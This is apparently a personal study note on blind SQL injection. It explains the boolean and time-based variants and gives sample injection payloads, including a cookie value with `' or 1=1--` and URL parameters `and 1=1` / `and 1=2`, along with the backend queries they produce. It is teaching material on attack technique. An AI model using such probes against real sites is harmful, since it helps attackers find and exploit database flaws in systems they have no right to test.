# General 

## Types

#### BLIND
- *no data is sent back to the client after performing an attack*
- there is no actual transfer of data via the web application

# exploit
- asking true and false questions 
> cookie: test=test`' or 1=1--`

--> 2 types of blind injections
- Boolean ( true or false )
- Time ( sleep attacks )


-> Boolean <- 
- blind SQL Injection technique that uses Boolean conditions to return a different result depending on whether the query returns a TRUE or FALSE result.

```
www.random.com/app.php?id=1
```
- force a false payload to see how the application responds
- force a true payload to see how the application responds

> if they act differently ( true vs falls ) then it is vulnerable to Boolean attacks

```
www.random.com/app.php?id=1

---- backend query ----
select title from product where id=1

>>

---- false payload ----
www.random.com/app.php?id=1 and 1=2

---- backend query ----
select title from product where id=1 and 1=2

---- true payload ----
www.random.com/app.php?id=1 and 1=1

---- backend query ----
select title from product where id=1 and 1=1
```





#### Resources:

[[resources_VU]]
